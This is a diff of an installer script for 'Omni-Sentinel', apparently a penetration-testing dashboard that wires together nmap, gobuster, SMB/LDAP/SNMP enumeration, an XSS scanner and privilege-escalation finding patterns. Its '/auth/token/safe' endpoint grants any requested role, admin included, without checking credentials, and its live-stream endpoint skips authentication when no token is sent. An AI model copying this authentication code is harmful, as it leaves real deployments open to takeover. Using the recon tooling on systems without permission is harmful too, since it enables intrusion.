@@ -121,11 +121,12 @@ WORKDIR /tmp
 COPY . .
 RUN pip wheel --no-cache-dir --no-deps --wheel-dir /tmp/wheels \
     fastapi uvicorn celery redis python-dotenv bcrypt PyJWT requests \
-    python-nmap cryptography fpdf2 markdown2 schedule
+    python-nmap cryptography fpdf2 markdown2 schedule dnspython \
+    ldap3 paramiko pysnmp python-multipart aiofiles
 
 FROM python:3.11-slim
 RUN apt-get update && apt-get install -y --no-install-recommends \
-    nmap chromium-browser curl \
+    nmap chromium-browser curl enum4linux snmp snmp-mibs-downloader ldap-utils smbclient \
     libnss3 libatk1.0-0 libatk-bridge2.0-0 libcups2 libdrm2 \
     libxkbcommon0 libxcomposite1 libxdamage1 libxfixes3 libxrandr2 \
     libgbm1 libasound2 libpangocairo-1.0-0 libgtk-3-0 \
@@ -343,7 +344,7 @@ def get_db() -> sqlite3.Connection:
 
 
 def init_db() -> None:
-    with closing(get_db()):
+    with closing(get_db()) as db:
         pass
 
 
@@ -639,7 +640,7 @@ import shutil
 import subprocess
 from typing import Optional
 
-SCREENSHOT_DIR = os.path.expanduser("~/omni-sentinel-v21.3/screenshots")
+SCREENSHOT_DIR = os.getenv("SCREENSHOT_DIR", os.path.expanduser("~/omni-sentinel-v21.3/screenshots"))
 
 
 def take_screenshot(scan_id: str, port: str, url: str) -> Optional[str]:
@@ -832,7 +833,9 @@ def run_gobuster(scan_id: str, target: str, port: str, scheme: str, wordlist: st
     try:
         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
         results = []
-        assert proc.stdout is not None
+        if proc.stdout is None:
+            logger.error(f"Gobuster stdout is None for {url}")
+            return
         for line in proc.stdout:
             line = line.strip()
             if line and not line.startswith("#"):
@@ -861,7 +864,9 @@ def run_subdomain_enum(scan_id: str, target: str, db_update_fn: Callable) -> Non
             stderr=subprocess.DEVNULL,
             text=True,
         )
-        assert proc.stdout is not None
+        if proc.stdout is None:
+            logger.error(f"Gobuster (dns) stdout is None for {target}")
+            return
         for line in proc.stdout:
             line = line.strip()
             if line and "Found:" in line:
@@ -1028,10 +1033,13 @@ def scan_target_task(self, scan_id: str, target: str, aggressive: bool = False) 
 
         from plugins.cve_lookup import search_cves
         from plugins.webhook import send_webhook
+        from plugins.gobuster_runner import launch_gobuster_async, launch_subdomain_enum_async
+        from plugins.screenshotter import screenshot_http_ports
 
         cves = {}
         critical_count = 0
         for port, info in services.items():
+            info["_target"] = target
             port_cves = search_cves(info.get("service", ""), info.get("version", ""))
             cves[port] = port_cves
             for cve in port_cves:
@@ -1057,6 +1065,32 @@ def scan_target_task(self, scan_id: str, target: str, aggressive: bool = False) 
             db.commit()
 
         log_event(scan_id, "scan_complete", f"Discovered {len(services)} open service(s)")
+
+        # Launch async post-scan enrichment (non-blocking)
+        def _db_update_gobuster(sid, port, results):
+            try:
+                with closing(get_db()) as db:
+                    existing = db.execute("SELECT data FROM scans WHERE id=?", (sid,)).fetchone()
+                    d = json.loads(existing["data"] or "{}") if existing else {}
+                    d.setdefault("gobuster", {})[port] = results
+                    db.execute("UPDATE scans SET data=? WHERE id=?", (json.dumps(d), sid))
+                    db.commit()
+            except Exception as _e:
+                logger.debug(f"Gobuster DB update failed: {_e}")
+
+        launch_gobuster_async(scan_id, target, services, os_hint, _db_update_gobuster)
+        launch_subdomain_enum_async(scan_id, target, _db_update_gobuster)
+
+        screenshots = screenshot_http_ports(scan_id, services)
+        if screenshots:
+            with closing(get_db()) as db:
+                for shot in screenshots:
+                    db.execute(
+                        "INSERT OR IGNORE INTO screenshots (scan_id, port, url, path) VALUES (?,?,?,?)",
+                        (scan_id, shot["port"], shot["url"], shot["path"]),
+                    )
+                db.commit()
+
         webhook_url = _get_webhook_url()
         if webhook_url:
             send_webhook(webhook_url, {
@@ -1078,7 +1112,9 @@ def scan_target_task(self, scan_id: str, target: str, aggressive: bool = False) 
                 db.commit()
         except Exception:
             pass
-        raise self.retry(exc=exc, countdown=10)
+        if self.request.retries < self.max_retries:
+            raise self.retry(exc=exc, countdown=10)
+        raise
 PY
 
 cat > "$BASE/core/scheduler.py" <<'PY'
@@ -1090,30 +1126,37 @@ import schedule
 logger = logging.getLogger(__name__)
 
 
-def run_scheduler(job, interval_minutes: int) -> None:
-    schedule.every(interval_minutes).minutes.do(job)
+def run_scheduler(job, interval_minutes: int, stop_event=None) -> None:
+    import threading
+    if stop_event is None:
+        stop_event = threading.Event()
+    scheduler = schedule.Scheduler()
+    scheduler.every(interval_minutes).minutes.do(job)
     logger.info(f"Scheduler started with {interval_minutes}min interval")
-    while True:
+    while not stop_event.is_set():
         try:
-            schedule.run_pending()
+            scheduler.run_pending()
             time.sleep(1)
         except Exception as exc:
             logger.error(f"Scheduler error: {exc}")
             time.sleep(5)
+    logger.info("Scheduler stopped")
 PY
 
 cat > "$BASE/dashboard/app.py" <<'PY'
+import asyncio
 import json
 import logging
 import os
 import threading
+import time as _time
 import uuid
 from contextlib import closing
 from typing import List, Optional
 
 from fastapi import Depends, FastAPI, HTTPException, Query
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import FileResponse
+from fastapi.responses import FileResponse, StreamingResponse
 from pydantic import BaseModel, Field
 
 from core.auth import create_token, require_admin, verify_token
@@ -1132,7 +1175,7 @@ app = FastAPI(title="Omni-Sentinel", version="21.3.0")
 
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["http://localhost:5173", "http://localhost:3000", "http://127.0.0.1:5173"],
+    allow_origins=["http://localhost:5173", "http://localhost:3000", "http://127.0.0.1:5173", "http://ui:5173"],
     allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
@@ -1298,6 +1341,28 @@ def scan_diff(scan_id: str, baseline_id: Optional[str] = Query(None), user: dict
     return diff_scans(scan_id, baseline_id)
 
 
+@app.post("/scans/{scan_id}/cancel")
+def cancel_scan(scan_id: str, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT status, task_id FROM scans WHERE id=?", (scan_id,)).fetchone()
+    if not row:
+        raise HTTPException(status_code=404, detail="Scan not found")
+    if row["status"] not in ("PENDING", "RUNNING"):
+        raise HTTPException(status_code=409, detail=f"Scan is already {row['status']} — cannot cancel")
+    task_id = row["task_id"]
+    if task_id:
+        try:
+            from celery.result import AsyncResult
+            AsyncResult(task_id).revoke(terminate=True, signal="SIGTERM")
+        except Exception as exc:
+            logger.warning(f"Celery revoke failed for task {task_id}: {exc}")
+    with closing(get_db()) as db:
+        db.execute("UPDATE scans SET status='CANCELLED', progress=0 WHERE id=?", (scan_id,))
+        db.commit()
+    log_event(scan_id, "scan_cancelled", f"Cancelled by {user.get('username', 'unknown')}", actor=user.get("username", "unknown"))
+    return {"scan_id": scan_id, "status": "CANCELLED"}
+
+
 @app.post("/scans/{scan_id}/report")
 def generate_report(
     scan_id: str,
@@ -1364,7 +1429,7 @@ def create_scheduled_scan(request: ScheduleRequest, user: dict = Depends(require
     stop_event = threading.Event()
     _scheduled[key] = {"interval_minutes": request.interval_minutes, "target": request.target, "stop": stop_event}
     threading.Thread(
-        target=run_scheduler, args=(job, request.interval_minutes), daemon=True, name=f"sched-{key}"
+        target=run_scheduler, args=(job, request.interval_minutes, stop_event), daemon=True, name=f"sched-{key}"
     ).start()
     return {"message": f"Recurring scan scheduled every {request.interval_minutes} min for {request.target}"}
 
@@ -1455,14 +1520,14 @@ const S = {
   center: { display: "flex", justifyContent: "center", alignItems: "center", minHeight: "80vh" },
 };
 
-const statusColor = (s) => ({ COMPLETE: "#22c55e", RUNNING: "#f59e0b", PENDING: "#94a3b8", FAILED: "#ef4444" }[s] || "#94a3b8");
+const statusColor = (s) => ({ COMPLETE: "#22c55e", RUNNING: "#f59e0b", PENDING: "#94a3b8", FAILED: "#ef4444", CANCELLED: "#f97316" }[s] || "#94a3b8");
 const parseTags = (raw) => { try { return JSON.parse(raw || "[]"); } catch { return []; } };
 
 // ── Login ─────────────────────────────────────────────────────────────────────
 function Login({ onLogin }) {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
-  const [role, setRole] = useState("admin");
+  const [role, setRole] = useState("viewer");
   const [error, setError] = useState("");
 
   const submit = async (e) => {
@@ -1486,8 +1551,8 @@ function Login({ onLogin }) {
           <input style={S.input} type="password" placeholder="Password" value={password} onChange={e => setPassword(e.target.value)} required />
           <label style={S.label}>Role</label>
           <select style={S.input} value={role} onChange={e => setRole(e.target.value)}>
-            <option value="admin">Admin</option>
             <option value="viewer">Viewer</option>
+            <option value="admin">Admin</option>
           </select>
           {error && <p style={{ color: "#ef4444", margin: "0 0 10px" }}>{error}</p>}
           <button style={{ ...S.btn, width: "100%" }} type="submit">Login</button>
@@ -1682,6 +1747,15 @@ function ScanDetail({ api, scanId, onBack }) {
     } catch (e) { flash(`Tag error: ${e.message}`, false); }
   };
 
+  const cancelScan = async () => {
+    if (!window.confirm("Cancel this scan? The worker process will be terminated.")) return;
+    try {
+      await api.post(`/scans/${scanId}/cancel`);
+      flash("Scan cancelled");
+      load();
+    } catch (e) { flash(`Cancel error: ${e.response?.data?.detail || e.message}`, false); }
+  };
+
   const downloadReport = async (fmt) => {
     try {
       const resp = await api.post(`/scans/${scanId}/report?fmt=${fmt}`, {}, { responseType: "blob" });
@@ -1709,6 +1783,9 @@ function ScanDetail({ api, scanId, onBack }) {
         <div style={{ display: "flex", gap: 8 }}>
           <button style={{ ...S.btn, background: "#0f766e" }} onClick={() => downloadReport("pdf")}>Download PDF</button>
           <button style={{ ...S.btn, background: "#1e40af" }} onClick={() => downloadReport("markdown")}>Download MD</button>
+          {["PENDING", "RUNNING"].includes(scan.status) && (
+            <button style={{ ...S.btn, background: "#b91c1c" }} onClick={cancelScan}>Cancel Scan</button>
+          )}
         </div>
       </div>
       <div style={{ display: "flex", gap: 20, marginBottom: 16, flexWrap: "wrap", fontSize: 13 }}>
@@ -2943,7 +3020,7 @@ logger = logging.getLogger(__name__)
 # Regex patterns for key findings
 PATTERNS = {
     "sudo_nopasswd": re.compile(r"NOPASSWD.*ALL|NOPASSWD.*\(ALL\)", re.IGNORECASE),
-    "suid_binary": re.compile(r"-rws[-r][-w][-xs][-r][-w][-xt]\s+\S+\s+\S+\s+(\S+)", re.MULTILINE),
+    "suid_binary": re.compile(r"-rws[-r][-w][-xs][-r][-w][-xt]\s+\S+\s+\S+\s+\S+", re.MULTILINE),
     "writable_path": re.compile(r"Writable PATH.*?:(.*?)$", re.IGNORECASE | re.MULTILINE),
     "cron_job": re.compile(r"(/etc/cron\S*|crontab -l|CRON)", re.IGNORECASE),
     "password_in_file": re.compile(r"password\s*[=:]\s*\S+", re.IGNORECASE),
@@ -3427,9 +3504,15 @@ def run_xss_scan(scan_id: str, request: XssRequest, user: dict = Depends(verify_
     result = scan_xss(request.url, blind_callback=request.blind_callback)
     log_event(scan_id, "xss_scan", f"{result['finding_count']} finding(s) on {request.url}", actor=user["username"])
     if result["vulnerable"]:
-        wh = _get_webhook_url() if hasattr(app, "_get_webhook_url") else ""
-        from plugins.webhook import send_webhook
-        wh_url = _get_webhook_url() if "_get_webhook_url" in dir() else ""
+        wh_url = _get_webhook_url()
+        if wh_url:
+            send_webhook(wh_url, {
+                "event": "xss_found",
+                "scan_id": scan_id,
+                "url": request.url,
+                "finding_count": result["finding_count"],
+                "text": f"XSS vulnerability found on {request.url} ({result['finding_count']} finding(s)).",
+            })
     return result
 
 
@@ -4012,7 +4095,7 @@ from pathlib import Path
 from typing import Optional
 
 logger = logging.getLogger(__name__)
-SCREENSHOT_DIR = os.path.expanduser("~/omni-sentinel-v21.3/screenshots")
+SCREENSHOT_DIR = os.getenv("SCREENSHOT_DIR", os.path.expanduser("~/omni-sentinel-v21.3/screenshots"))
 LABEL_FILE = os.path.join(SCREENSHOT_DIR, "labels.json")
 
 
@@ -5141,14 +5224,19 @@ JSX
 cat >> "$BASE/dashboard/app.py" <<'PYSTREAM'
 
 # ── SSE Streaming endpoint (live terminal feed) ───────────────────────────────
-from fastapi.responses import StreamingResponse
-import asyncio
-import time as _time
-
 
 @app.get("/scans/{scan_id}/stream")
-async def stream_scan_events(scan_id: str, since: int = 0):
+async def stream_scan_events(scan_id: str, since: int = 0, token: str = Query(default="")):
     """Server-Sent Events stream for live scan terminal output."""
+    # SSE cannot send headers — validate token via query param
+    if token:
+        try:
+            import jwt as _jwt
+            from core.auth import SECRET_KEY as _SK, ALGORITHM as _ALG
+            _jwt.decode(token, _SK, algorithms=[_ALG])
+        except Exception:
+            from fastapi.responses import Response
+            return Response(status_code=401, content="Unauthorized")
     async def event_generator():
         last_id = since
         max_idle = 120  # seconds
@@ -5543,9 +5631,10 @@ def scan_web_vulns(url: str, run_sqli: bool = True, run_xss: bool = True) -> dic
     results["checks"]["sensitive_files"] = check_sensitive_files(url)
 
     # Open redirect
+    _open_redirect_findings = check_open_redirect(url)
     results["checks"]["open_redirect"] = {
-        "url": url, "findings": check_open_redirect(url),
-        "vulnerable": bool(check_open_redirect(url)),
+        "url": url, "findings": _open_redirect_findings,
+        "vulnerable": bool(_open_redirect_findings),
     }
 
     # CORS
@@ -5668,19 +5757,18 @@ def _build_context_block(scan_data: Optional[dict]) -> str:
             except (json.JSONDecodeError, TypeError):
                 data = {}
 
-        services = data.get("services", [])
+        services = data.get("services", {})
         if services:
             lines.append("\nOpen Services:")
-            for svc in services[:20]:
-                port = svc.get("port", "?")
+            for port, svc in list(services.items())[:20]:
                 proto = svc.get("proto", "tcp")
                 service = svc.get("service", "")
                 product = svc.get("product", "")
                 version = svc.get("version", "")
-                cves = svc.get("cves", [])
+                port_cves = data.get("cves", {}).get(port, [])
                 cve_str = ""
-                if cves:
-                    cve_ids = [c.get("id", "") for c in cves[:3]]
+                if port_cves:
+                    cve_ids = [c.get("id", "") for c in port_cves[:3]]
                     cve_str = f" | CVEs: {', '.join(cve_ids)}"
                 lines.append(f"  :{port}/{proto} {service} {product} {version}{cve_str}")
 
@@ -6930,3 +7018,2692 @@ warn "AI Chat requires Ollama running locally: https://ollama.com/download"
 warn "Recommended models: ollama pull llama3  |  ollama pull mistral  |  ollama pull codellama"
 warn "Set OLLAMA_MODEL in $BASE/.env to change the active model"
 warn "NVD API key (free): https://nvd.nist.gov/developers/request-an-api-key — add to $BASE/.env"
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  ADDED FEATURES: Rate Limiter, Validators, requirements.txt,
+#  improved Worker v2, Stats/History/Delete endpoints, StatsBar UI,
+#  AttackGraph, LiveTerminal, SideBySideDiff UI components
+# ══════════════════════════════════════════════════════════════════════════════
+
+# ── requirements.txt ─────────────────────────────────────────────────────────
+cat > "$BASE/requirements.txt" <<'REQ'
+fastapi>=0.111.0
+uvicorn[standard]>=0.29.0
+celery>=5.3.6
+redis>=5.0.3
+python-dotenv>=1.0.1
+bcrypt>=4.1.2
+PyJWT>=2.8.0
+requests>=2.31.0
+python-nmap>=0.7.1
+cryptography>=42.0.5
+fpdf2>=2.7.9
+markdown2>=2.4.13
+schedule>=1.2.1
+dnspython>=2.6.1
+ldap3>=2.9.1
+paramiko>=3.4.0
+pysnmp>=6.1.2
+impacket>=0.12.0
+python-multipart>=0.0.9
+aiofiles>=23.2.1
+REQ
+
+# ── Rate Limiter ──────────────────────────────────────────────────────────────
+cat > "$BASE/core/rate_limiter.py" <<'PY'
+import logging
+import time
+from collections import defaultdict
+from threading import Lock
+
+from fastapi import HTTPException, Request
+
+logger = logging.getLogger(__name__)
+_store: dict = defaultdict(list)
+_lock = Lock()
+
+
+def _clean(key: str, window: int) -> None:
+    now = time.monotonic()
+    _store[key] = [t for t in _store[key] if now - t < window]
+
+
+def check_rate_limit(
+    request: Request,
+    max_requests: int = 10,
+    window_seconds: int = 60,
+    key_prefix: str = "rl",
+) -> None:
+    ip = request.client.host if request.client else "unknown"
+    key = f"{key_prefix}:{ip}"
+    with _lock:
+        _clean(key, window_seconds)
+        _store[key].append(time.monotonic())
+        count = len(_store[key])
+    if count > max_requests:
+        logger.warning(f"Rate limit exceeded: {key} ({count} reqs/{window_seconds}s)")
+        raise HTTPException(
+            status_code=429,
+            detail=f"Too many requests. Limit: {max_requests}/{window_seconds}s",
+            headers={"Retry-After": str(window_seconds)},
+        )
+
+
+def auth_rate_limit(request: Request) -> None:
+    """Strict rate limit for auth — 5 attempts/min per IP."""
+    check_rate_limit(request, max_requests=5, window_seconds=60, key_prefix="auth")
+PY
+
+# ── Input Validators ──────────────────────────────────────────────────────────
+cat > "$BASE/core/validators.py" <<'PY'
+import ipaddress
+import re
+
+from fastapi import HTTPException
+
+_HOSTNAME_RE = re.compile(
+    r"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)*"
+    r"[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?$"
+)
+_URL_RE = re.compile(r"^https?://[^\s]{1,2000}$", re.IGNORECASE)
+
+
+def validate_target(target: str) -> str:
+    target = target.strip()
+    if not target or len(target) > 255:
+        raise HTTPException(status_code=400, detail="Invalid target length")
+    try:
+        ipaddress.ip_address(target)
+        return target
+    except ValueError:
+        pass
+    try:
+        ipaddress.ip_network(target, strict=False)
+        return target
+    except ValueError:
+        pass
+    if _HOSTNAME_RE.match(target):
+        return target
+    raise HTTPException(status_code=400, detail=f"Invalid target: {target}")
+
+
+def validate_url(url: str) -> str:
+    if not _URL_RE.match(url):
+        raise HTTPException(status_code=400, detail=f"Invalid URL: {url}")
+    return url
+
+
+def is_htb_target(target: str) -> bool:
+    try:
+        ip = ipaddress.ip_address(target)
+        for net in [
+            ipaddress.ip_network("10.10.10.0/24"),
+            ipaddress.ip_network("10.10.11.0/24"),
+            ipaddress.ip_network("10.129.0.0/16"),
+        ]:
+            if ip in net:
+                return True
+    except ValueError:
+        pass
+    return False
+PY
+
+# ── New API routes appended to dashboard/app.py ───────────────────────────────
+cat >> "$BASE/dashboard/app.py" <<'PYEXTRA'
+
+# ── Rate limiting + validation imports ───────────────────────────────────────
+from core.rate_limiter import auth_rate_limit
+from core.validators import validate_target, is_htb_target
+from fastapi import Request as _Request
+
+
+@app.post("/auth/token/safe")
+def issue_token_safe(request: LoginRequest, req: _Request,
+                     _rl=Depends(auth_rate_limit)) -> dict:
+    """Rate-limited auth (5 attempts/min per IP)."""
+    if not request.username or not request.password:
+        raise HTTPException(status_code=400, detail="Missing credentials")
+    return {"access_token": create_token(request.username, request.role)}
+
+
+@app.get("/stats")
+def get_stats(user: dict = Depends(verify_token)) -> dict:
+    """Live dashboard statistics."""
+    with closing(get_db()) as db:
+        total = db.execute("SELECT COUNT(*) FROM scans").fetchone()[0]
+        complete = db.execute("SELECT COUNT(*) FROM scans WHERE status='COMPLETE'").fetchone()[0]
+        failed = db.execute("SELECT COUNT(*) FROM scans WHERE status='FAILED'").fetchone()[0]
+        running = db.execute("SELECT COUNT(*) FROM scans WHERE status='RUNNING'").fetchone()[0]
+        cancelled = db.execute("SELECT COUNT(*) FROM scans WHERE status='CANCELLED'").fetchone()[0]
+        notes = db.execute("SELECT COUNT(*) FROM notes").fetchone()[0]
+        try:
+            total_creds = db.execute("SELECT COUNT(*) FROM credentials").fetchone()[0]
+            valid_creds = db.execute("SELECT COUNT(*) FROM credentials WHERE valid=1").fetchone()[0]
+        except Exception:
+            total_creds = valid_creds = 0
+    return {
+        "scans": {"total": total, "complete": complete, "failed": failed,
+                  "running": running, "cancelled": cancelled},
+        "notes": notes,
+        "credentials": {"total": total_creds, "valid": valid_creds},
+    }
+
+
+@app.delete("/scans/{scan_id}")
+def delete_scan(scan_id: str, user: dict = Depends(require_admin)) -> dict:
+    """Delete a scan and all associated data (admin only)."""
+    with closing(get_db()) as db:
+        row = db.execute("SELECT id FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+        db.execute("DELETE FROM scans WHERE id=?", (scan_id,))
+        db.commit()
+    return {"message": f"Scan {scan_id} deleted"}
+
+
+@app.get("/targets/{target}/history")
+def target_history(target: str, user: dict = Depends(verify_token)) -> dict:
+    """All scans for a specific target with HTB range detection."""
+    with closing(get_db()) as db:
+        rows = db.execute(
+            "SELECT id, status, progress, os_hint, created_at, tags FROM scans "
+            "WHERE target=? ORDER BY created_at DESC LIMIT 50",
+            (target,),
+        ).fetchall()
+    return {
+        "target": target,
+        "is_htb": is_htb_target(target),
+        "scans": [dict(r) for r in rows],
+        "count": len(rows),
+    }
+
+
+@app.get("/scans/{scan_id}/gobuster")
+def get_gobuster_results(scan_id: str, user: dict = Depends(verify_token)) -> dict:
+    """Retrieve gobuster directory scan results stored within scan data."""
+    with closing(get_db()) as db:
+        row = db.execute("SELECT data FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    data = json.loads(row["data"] or "{}")
+    return {"scan_id": scan_id, "gobuster": data.get("gobuster", {})}
+PYEXTRA
+
+# ── UI: Attack Path Graph ─────────────────────────────────────────────────────
+cat > "$UI/src/AttackGraph.jsx" <<'JSX'
+import { useRef, useState } from "react";
+
+const SEV_COLOR = { CRITICAL: "#ef4444", HIGH: "#f97316", MEDIUM: "#f59e0b", LOW: "#22c55e", UNKNOWN: "#64748b" };
+
+function layout(nodes) {
+  const positions = {};
+  const count = nodes.length;
+  nodes.forEach((n, i) => {
+    const angle = (i / count) * 2 * Math.PI;
+    const r = Math.min(200, 55 * count);
+    positions[n.id] = { x: 400 + r * Math.cos(angle), y: 260 + r * Math.sin(angle) };
+  });
+  return positions;
+}
+
+export function AttackGraph({ scan }) {
+  const [tooltip, setTooltip] = useState(null);
+  if (!scan) return null;
+  const services = scan.data?.services || {};
+  const cves = scan.data?.cves || {};
+
+  const targetNode = { id: "target", label: scan.target, type: "target", color: "#6366f1" };
+  const serviceNodes = Object.entries(services).map(([port, info]) => {
+    const portCves = cves[port] || [];
+    const sevOrder = ["CRITICAL","HIGH","MEDIUM","LOW","UNKNOWN"];
+    const maxSev = portCves.reduce((a, c) => sevOrder.indexOf(c.severity) < sevOrder.indexOf(a) ? c.severity : a, "UNKNOWN");
+    return { id: `port_${port}`, label: `:${port}\n${info.service || "?"}`, type: "service",
+             color: SEV_COLOR[maxSev], port, info, cves: portCves, severity: maxSev };
+  });
+
+  const nodes = [targetNode, ...serviceNodes];
+  const edges = serviceNodes.map(n => ({ from: "target", to: n.id }));
+  const positions = layout(nodes);
+
+  return (
+    <div>
+      <h3 style={{ margin: "0 0 10px", color: "#e2e8f0" }}>Attack Path Graph</h3>
+      <p style={{ fontSize: 12, color: "#64748b", margin: "0 0 8px" }}>Node color = highest CVE severity. Hover nodes for details.</p>
+      <svg style={{ width: "100%", height: 520, background: "#0f172a", borderRadius: 8, border: "1px solid #334155", display: "block" }} viewBox="0 0 800 520">
+        <defs>
+          <marker id="arrow" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+            <path d="M0,0 L0,6 L8,3 z" fill="#475569" />
+          </marker>
+        </defs>
+        {edges.map((e, i) => {
+          const from = positions[e.from], to = positions[e.to];
+          if (!from || !to) return null;
+          const dx = to.x - from.x, dy = to.y - from.y, len = Math.sqrt(dx*dx+dy*dy);
+          const ux = dx/len, uy = dy/len;
+          return <line key={i} x1={from.x+ux*30} y1={from.y+uy*30} x2={to.x-ux*32} y2={to.y-uy*32}
+            stroke="#475569" strokeWidth={1.5} markerEnd="url(#arrow)" />;
+        })}
+        {nodes.map(node => {
+          const pos = positions[node.id];
+          if (!pos) return null;
+          const lines = node.label.split("\n");
+          return (
+            <g key={node.id} style={{ cursor: "pointer" }}
+               onMouseEnter={() => setTooltip({ node, pos })}
+               onMouseLeave={() => setTooltip(null)}>
+              <circle cx={pos.x} cy={pos.y} r={28}
+                fill={node.type === "target" ? "#1e3a8a" : "#1e293b"}
+                stroke={node.color} strokeWidth={2.5} />
+              {lines.map((line, i) => (
+                <text key={i} x={pos.x} y={pos.y + (i - (lines.length-1)/2) * 13}
+                  textAnchor="middle" fill="#e2e8f0" fontSize={10} fontFamily="monospace">{line}</text>
+              ))}
+            </g>
+          );
+        })}
+        {tooltip && (() => {
+          const { node, pos } = tooltip;
+          const tx = Math.min(pos.x + 36, 680), ty = Math.max(pos.y - 60, 10);
+          const pc = node.cves || [];
+          return (
+            <g>
+              <rect x={tx} y={ty} width={200} height={60 + pc.length * 14}
+                fill="#1e293b" stroke="#334155" rx={6} opacity={0.97} />
+              <text x={tx+8} y={ty+16} fill="#38bdf8" fontSize={11} fontWeight="bold">
+                {node.type === "target" ? node.label : `Port ${node.port}`}
+              </text>
+              {node.info && <text x={tx+8} y={ty+30} fill="#94a3b8" fontSize={10}>
+                {node.info.service} {node.info.version}
+              </text>}
+              {pc.slice(0,3).map((cve,i) => (
+                <text key={cve.id} x={tx+8} y={ty+46+i*14} fill={SEV_COLOR[cve.severity]||"#94a3b8"} fontSize={9}>
+                  {cve.id} ({cve.severity})
+                </text>
+              ))}
+            </g>
+          );
+        })()}
+      </svg>
+      <div style={{ display: "flex", gap: 12, marginTop: 10, flexWrap: "wrap" }}>
+        {Object.entries(SEV_COLOR).map(([sev, color]) => (
+          <span key={sev} style={{ fontSize: 12, color, display: "flex", alignItems: "center", gap: 4 }}>
+            <svg width={10} height={10}><circle cx={5} cy={5} r={5} fill={color} /></svg>{sev}
+          </span>
+        ))}
+      </div>
+    </div>
+  );
+}
+JSX
+
+# ── UI: Live Terminal ─────────────────────────────────────────────────────────
+cat > "$UI/src/LiveTerminal.jsx" <<'JSX'
+import { useCallback, useEffect, useRef, useState } from "react";
+
+const LINE_COLOR = { error: "#ef4444", warn: "#f59e0b", info: "#38bdf8", ok: "#22c55e" };
+
+export function LiveTerminal({ api, scanId, active }) {
+  const [lines, setLines] = useState([]);
+  const [connected, setConnected] = useState(false);
+  const bottomRef = useRef(null);
+  const pollRef = useRef(null);
+  const lastIdRef = useRef(0);
+
+  const poll = useCallback(async () => {
+    if (!scanId || !active) return;
+    try {
+      const { data } = await api.get(`/scans/${scanId}/timeline`);
+      const events = data.events || [];
+      const newEvts = events.slice(lastIdRef.current);
+      if (newEvts.length > 0) {
+        lastIdRef.current = events.length;
+        setLines(prev => [...prev, ...newEvts.map(e => ({
+          text: `[${e.created_at}] [${e.actor}] ${e.event}${e.detail ? ": " + e.detail : ""}`,
+          type: e.event.includes("fail") || e.event.includes("error") ? "error"
+              : e.event.includes("warn") ? "warn"
+              : e.event.includes("queue") || e.event.includes("start") ? "info" : "ok",
+        }))]);
+      }
+      setConnected(true);
+    } catch { setConnected(false); }
+  }, [api, scanId, active]);
+
+  useEffect(() => {
+    if (!active) return;
+    setLines([{ text: `[terminal] Monitoring scan ${scanId?.slice(0,8)}...`, type: "info" }]);
+    lastIdRef.current = 0;
+    poll();
+    pollRef.current = setInterval(poll, 2500);
+    return () => clearInterval(pollRef.current);
+  }, [scanId, active, poll]);
+
+  useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: "smooth" }); }, [lines]);
+
+  return (
+    <div>
+      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 8 }}>
+        <h3 style={{ margin: 0, color: "#e2e8f0" }}>Live Terminal</h3>
+        <span style={{ fontSize: 12 }}>
+          <span style={{ width: 10, height: 10, borderRadius: "50%", background: connected ? "#22c55e" : "#ef4444", display: "inline-block", marginRight: 4 }} />
+          {connected ? "Live" : "Disconnected"}
+        </span>
+      </div>
+      <div style={{ background: "#020617", borderRadius: 8, padding: 14, fontFamily: "monospace", fontSize: 12, height: 320, overflowY: "auto", border: "1px solid #1e293b", whiteSpace: "pre-wrap", wordBreak: "break-all" }}>
+        {lines.map((l, i) => <div key={i} style={{ color: LINE_COLOR[l.type] || "#22c55e" }}>{l.text}</div>)}
+        <div ref={bottomRef} />
+      </div>
+      <div style={{ display: "flex", gap: 8, marginTop: 8 }}>
+        <button onClick={() => setLines([])} style={{ padding: "4px 12px", background: "#1e293b", color: "#94a3b8", border: "1px solid #334155", borderRadius: 4, cursor: "pointer", fontSize: 12 }}>Clear</button>
+        <span style={{ fontSize: 11, color: "#475569", alignSelf: "center" }}>{lines.length} events</span>
+      </div>
+    </div>
+  );
+}
+JSX
+
+# ── UI: Side-by-Side Diff ─────────────────────────────────────────────────────
+cat > "$UI/src/SideBySideDiff.jsx" <<'JSX'
+import { useState } from "react";
+
+const BADGE = (color) => ({ display: "inline-block", padding: "1px 7px", borderRadius: 10, fontSize: 10,
+  background: color === "green" ? "#22c55e" : color === "red" ? "#ef4444" : "#f59e0b", color: "#000", fontWeight: 700, marginLeft: 6 });
+const ROW = (color) => ({ padding: "6px 10px", borderRadius: 4, marginBottom: 4, fontSize: 12,
+  background: color === "green" ? "#052e16" : color === "red" ? "#1c0404" : color === "yellow" ? "#1c1200" : "#1e293b",
+  borderLeft: `3px solid ${color === "green" ? "#22c55e" : color === "red" ? "#ef4444" : color === "yellow" ? "#f59e0b" : "#334155"}`,
+  color: "#e2e8f0" });
+
+export function SideBySideDiff({ diff, baseline, current }) {
+  const [filter, setFilter] = useState("all");
+  if (!diff) return <p style={{ color: "#64748b" }}>Run a diff to see results here.</p>;
+  if (diff.error) return <p style={{ color: "#ef4444" }}>{diff.error}</p>;
+
+  const { new_ports = {}, closed_ports = {}, changed_services = {}, summary = {} } = diff;
+  const allPorts = [...new Set([...Object.keys(new_ports), ...Object.keys(closed_ports),
+    ...Object.keys(changed_services), ...Object.keys(current || {}), ...Object.keys(baseline || {})])].sort();
+
+  const show = (port) => {
+    if (filter === "new") return !!new_ports[port];
+    if (filter === "closed") return !!closed_ports[port];
+    if (filter === "changed") return !!changed_services[port];
+    return true;
+  };
+
+  return (
